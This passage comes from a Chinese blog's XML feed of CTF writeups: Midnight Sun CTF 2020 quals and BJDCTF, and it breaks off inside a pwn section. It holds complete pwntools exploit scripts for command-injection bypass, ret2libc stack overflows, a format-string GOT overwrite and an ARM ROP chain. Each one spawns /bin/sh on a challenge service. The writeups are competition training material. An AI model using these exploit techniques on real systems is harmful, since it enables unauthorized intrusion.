src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315214046.png"></p><p>将流量包用 foremost 分析出压缩包 00002778.zip ，需密码才能解压 flag.txt ，继续查询流量，发现有 6666.jpg </p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315154335.png"></p><p>右键跟踪 tcp 流量，点击 save as 保存数据，用文本编辑器打开，将 FFD8 jpg 文件头前数据删除，以及最后一个 FFD9 后面数据删除，全选复制。</p><p>用 winhex 或者 010editor 新建一个空白文件，以 ascii-hex 写入数据，并保存为 jpg ，获得解压密码。</p><p>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>midnight-sun-ctf-2020-quals-writeup</title>
      <link href="archives/4a91183a/"/>
      <url>archives/4a91183a/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做国外 CTF 与国内有差异的，我感觉最明显的是题目会多个方向混合出题，比如说 web 与 pwn 结合出题。从部分题目和结合前几天看的 king of hill 直播，感觉国外 CTF 对 linux 知识也要有一定要求，不能仅仅只会做题的亚子。</p><h1 id="admpanel"><a href="#admpanel" class="headerlink" title="admpanel"></a>admpanel</h1><p><strong>考点：代码能力、linux基操</strong></p><p>程序为一个面板，自然有登录功能，帐号密码通过 IDA 看代码得出。登录成功后可以执行命令，但是程序给出提示只能执行 id 。但是使用的判断函数是 strncmp ，只要是子串都可以通过，换句话就是只有含有 id 都能执行。</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = remote(&amp;quot;admpanel-<span class="number">01.</span>play.midnightsunctf.se&amp;quot;,<span class="number">31337</span>)</span><br><span class="line"><span class="comment">#p = process(&amp;quot;./admpanel&amp;quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;quot;[<span class="number">3</span>] - Exit&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">1</span>&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;username:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;adminskye&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;password:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;passwordskye&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;cat flag&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;[<span class="number">3</span>] - Exit&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">2</span>&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;execute&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="built_in">id</span>&amp;amp;&amp;amp;/<span class="built_in">bin</span>/sh&amp;quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn 1"></a>pwn 1</h1><p><strong>考点：栈溢出、ret2libc</strong></p><p>程序无预留后门，给了 libc 文件，因此需要 ret2libc 。栈溢出漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  printf_pic();</span><br><span class="line">  <span class="built_in">printf</span>(&amp;quot;buffer: &amp;quot;, <span class="number">0LL</span>);</span><br><span class="line">  gets(&amp;amp;v4);<span class="comment">//栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次需要泄露 libc_base 地址，然后 rop 回到 main 函数。第二次调用 system(‘/bin/sh’) 。</p><p>emmm这道题我用官方给的 libc 本地打不通，用本地系统 libc 就打成功了。然后死活连不上远程服务器，就没有拿 flag 。</p><p>** 完整 exp ：**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#sh = remote(&amp;#039;111.198.29.45&amp;#039;,53033)</span></span><br><span class="line">sh=process(&amp;<span class="comment">#039;./level3&amp;#039;)</span></span><br><span class="line"> </span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">elf=ELF(&amp;<span class="comment">#039;./level3&amp;#039;)</span></span><br><span class="line">libc=ELF(&amp;<span class="comment">#039;./libc_32.so.6&amp;#039;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#get func address</span></span><br><span class="line">write_plt = elf.plt[&amp;<span class="comment">#039;write&amp;#039;]</span></span><br><span class="line">write_got = elf.got[&amp;<span class="comment">#039;write&amp;#039;]</span></span><br><span class="line">main_addr = elf.symbols[&amp;<span class="comment">#039;main&amp;#039;]</span></span><br><span class="line"> </span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039;*0x8c + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span></span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(&amp;quot;Input:\n&amp;quot;,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak write&amp;#039;s addr in got</span></span><br><span class="line">write_got_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;write_got address is&amp;#039;,hex(write_got_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc&amp;#039;s addr</span></span><br><span class="line">libc_addr = write_got_addr - libc.symbols[&amp;<span class="comment">#039;write&amp;#039;]</span></span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;libc address is&amp;#039;,hex(libc_addr)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#get system&amp;#039;s addr</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;system address is&amp;#039;,hex(sys_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get bin/sh &amp;#039;s addr    strings -a -t x libc_32.so.6 | grep &amp;quot;/bin/sh&amp;quot;</span></span><br><span class="line"><span class="comment">#libc.search(&amp;quot;/bin/sh&amp;quot;).next()</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x15902b</span></span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;/bin/sh address is&amp;#039;,hex(bin_sh_addr)</span></span><br><span class="line"><span class="comment">#get second payload</span></span><br><span class="line">payload0 = &amp;<span class="comment">#039;a&amp;#039;*0x88 + &amp;#039;a&amp;#039;*0x4 + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn 2"></a>pwn 2</h1><p><strong>考点：格式化字符串、覆写 exit_got rop 、格式化字符串泄露函数地址</strong></p><p>格式化字符串输入长度限制为 64 ，程序有 cannary 保护，且字符串输入长度不足够覆盖 eip ，因此需要另为的方法完成 rop 。办法就是覆写 exit 函数的 got 表地址为 main 地址。漏洞函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s[<span class="number">4</span>]; // [esp+0h] [ebp-4Ch]</span><br><span class="line">  char v2; // [esp+4h] [ebp-48h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [esp+40h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> *v4; // [esp+44h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = &amp;amp;a1;</span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  *(_DWORD *)s = <span class="number">0</span>;</span><br><span class="line">  memset(&amp;amp;v2, <span class="number">0</span>, 0x3Cu);</span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_80485B6();</span><br><span class="line">  printf(&amp;quot;<span class="built_in">input</span>: &amp;quot;);</span><br><span class="line">  fgets(s, <span class="number">0x40</span>, stdin);</span><br><span class="line">  printf(s);//格式化字符串漏洞</span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这一步就和 pwn1 基本相识了，一次泄露 libc 基地址，一次完成覆写调用 system(‘/bin/sh’) 。也就是用格式化字符串泄露函数地址，用格式化字符串覆写函数 got 表地址。</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;info&amp;#039;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&amp;quot;pwn2-01.play.midnightsunctf.se&amp;quot;,10002)</span></span><br><span class="line">p = process(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line">elf = ELF(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line">libc = ELF(&amp;quot;./libc.so<span class="number">.6</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">exit_got = <span class="number">0x0804b020</span></span><br><span class="line">printf_got = <span class="number">0x804b00c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">payload = p32(exit_got)  </span><br><span class="line">payload += &amp;<span class="comment">#039;%34289c%7$hn&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;input&amp;#039;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;input&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;quot;%<span class="number">30</span>$x&amp;quot;.ljust((<span class="number">63</span>-<span class="built_in">len</span>(&amp;quot;%<span class="number">30</span>$x&amp;quot;)),&amp;<span class="comment">#039;A&amp;#039;))</span></span><br><span class="line">data = p.recvuntil(&amp;quot;A&amp;quot;)</span><br><span class="line">printf_leak = <span class="built_in">int</span>(&amp;quot;0x&amp;quot;+data[-<span class="number">9</span>:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = printf_leak - libc.symbols[&amp;#039;printf&amp;#039;]</span></span><br><span class="line">libc_base = <span class="number">0x0804B010</span> - libc.symbols[&amp;<span class="comment">#039;printf&amp;#039;]</span></span><br><span class="line">log.info(&amp;quot;libc_base: &amp;quot;+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">log.success(&amp;quot;system_addr:&amp;quot;+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload = pwnlib.fmtstr.fmtstr_payload(<span class="number">7</span>, &#123;printf_got:system_addr&#125;, numbwritten=<span class="number">0</span>, write_size=&amp;<span class="comment">#039;byte&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;quot;<span class="built_in">input</span>:&amp;quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn 3"></a>pwn 3</h1><p><strong>考点：栈溢出</strong></p><p>32 位只打开 NX 保护程序。IDA 打开函数名劝退。耐心分析后，找到 main 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_102FC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+0h] [bp+0h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+4h] [bp+4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  sub_1FDB0(&amp;amp;v3, <span class="number">0</span>, <span class="number">124</span>);</span><br><span class="line">  sub_155C0(off_6F4BC, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_155C0(off_6F4B8, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v0 = sub_2120C(<span class="number">60</span>);</span><br><span class="line">  sub_102E4(v0);<span class="comment">//读取banner.txt入口函数</span></span><br><span class="line">  sub_14D00(&amp;quot;buffer: &amp;quot;);<span class="comment">//printf</span></span><br><span class="line">  sub_152A4(&amp;amp;v2, <span class="number">512</span>, off_6F4BC);<span class="comment">//read；栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要重点关注的是 sub_102E4 ，判断是通过 system 读取文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_102E4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> my_system((<span class="keyword">int</span>)&amp;quot;cat ./banner.txt&amp;quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 IDA 中找不到 system plt 地址，所以就看 sub_102E4  的汇编，找到传参的寄存器和方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_102E4                               ; CODE XREF: sub_102FC+<span class="number">40</span>↓p</span><br><span class="line">.text:<span class="number">000102E4</span>                 PUSH            &#123;R7,LR&#125;</span><br><span class="line">.text:<span class="number">000102E6</span>                 ADD             R7, SP, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">000102E8</span>                 LDR             R3, =(aCatBannerTxt - <span class="number">0x102EE</span>)</span><br><span class="line">.text:<span class="number">000102</span>EA                 ADD             R3, PC  ; &amp;quot;cat ./banner.txt&amp;quot;</span><br><span class="line">.text:<span class="number">000102</span>EC                 MOV             R0, R3</span><br><span class="line">.text:<span class="number">000102</span>EE                 BL              my_system</span><br><span class="line">.text:<span class="number">000102F</span>2                 NOP</span><br><span class="line">.text:<span class="number">000102F</span>4                 POP             &#123;R7,PC&#125;</span><br></pre></td></tr></table></figure><p>找到之后就是用 ROPgadget 找可以用的寄存器传 /bin/sh 给 system 就行。 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">/bin/sh</span></span><br><span class="line">ROPgadget --binary pwn3 --string &amp;#039;/bin/sh&amp;#039;</span><br><span class="line">0x00049018 : /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash">gadget</span></span><br><span class="line">ROPgadget --binary pwn3 --only &amp;#039;pop&amp;#039;</span><br></pre></td></tr></table></figure><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = process(&amp;quot;./pwn3&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;#039;pwn3-01.play.midnightsunctf.se&amp;#039;, 10003)</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x00049018</span></span><br><span class="line">system = <span class="number">0x14b5d</span></span><br><span class="line">pop_r0 = <span class="number">0x0001fb5c</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">140</span>)</span><br><span class="line">payload += p32(pop_r0)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;quot;buffer&amp;quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> midnightctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BJDCTF Writeup</title>
      <link href="archives/11/"/>
      <url>archives/11/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="最简单的misc"><a href="#最简单的misc" class="headerlink" title="最简单的misc"></a>最简单的misc</h2><p>zip 压缩包伪加密，改完标志位，解压得到文件 secret 。winhex 打开发现头部有 IHDR 标志，<del>盲猜</del>一个 PNG 文件，补一个文件头 89504E47 ，改后缀名。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323100003.png"></p><p>隔壁是作者，重点是下面。十六进制转 Ascii 得到 flag 。</p><h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>下载一个 png ，改高度得到 flag 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323100605.png"></p><h2 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h2><p>jpg 19.9M 你见过么？反正我没见过。binwalk 一下没有东西，foremost 一下出来一个压缩包，里面还是一个大得出奇的 jpg 。winhex 看了一下 avi 文件，改后缀名，得到一段鬼畜，pr 逐帧查看视频，找到四个二维码，扫码。十六进制转 Ascii 码，转码后调整顺序得到 flag 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200324001949.png"></p><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>认真填写才能获得 flag</p><h2 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h2><p><del>用 stegdetect 检查 jpeg 文件，发现 jphide 加密。</del></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe <span class="literal">-s</span> <span class="number">20</span> xiaojiejie.jpeg</span><br></pre></td></tr></table></figure><p><del>然后爆破密码？</del></p><p>对，没错想多了。只需要这样：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323221603.png"></p><h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>winhex 打开文件，仔细看，就能获得 flag 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323110134.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>base64 加密</p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h2><p>?：0 。?：1 。二进制再转字符串。</p><h2 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h2><p>十六进制转 Ascii ，再转维吉尼亚密码。密钥在 Ascii 解码后字符串前面</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA打开，shift + F12 查看字符串，得到 flag 。</p><h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>asm8086 单片机么？这个比较曲折，用物理机 IDA 逆向出奇奇怪怪的指令，用虚拟机 IDA 逆向就能看得懂大半部分。加密方式就是异或，密文是 aUDuTZWjQGjzZWz 的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea     bx, aUDuTZWjQGjzZWz ; <span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;</span></span><br><span class="line">loc_10039:                                               mov     di, cx</span><br><span class="line">dec     di</span><br><span class="line"><span class="keyword">xor</span>     byte ptr [bx+di], <span class="number">1F</span>h<span class="comment">//异或0x1f</span></span><br><span class="line">loop    loc_10039</span><br><span class="line">lea     dx, aUDuTZWjQGjzZWz ;</span><br><span class="line">mov     ah, <span class="number">9</span></span><br><span class="line"><span class="keyword">int</span>     <span class="number">21</span>h</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = [<span class="number">0x5D</span>, <span class="number">0x55</span>, <span class="number">0x5B</span>, <span class="number">0x64</span>, <span class="number">0x75</span>, <span class="number">0x7E</span>, <span class="number">0x7C</span>, <span class="number">0x74</span>, <span class="number">0x40</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x40</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x2E</span>, <span class="number">0x7D</span>, <span class="number">0x2E</span>, <span class="number">0x7E</span>,</span><br><span class="line">          <span class="number">0x71</span>, <span class="number">0x40</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x40</span>, <span class="number">0x77</span>, <span class="number">0x7A</span>, <span class="number">0x71</span>, <span class="number">0x57</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x62</span>, <span class="number">0x3B</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[i] ^ <span class="number">0x1F</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><p>跟攻防世界的一道题类似。漏洞在 name_check() ，会将传入参数 s strcpy 给 &amp;dest 造成溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">name_check</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+7h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,My dear %s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(&amp;dest, s);# 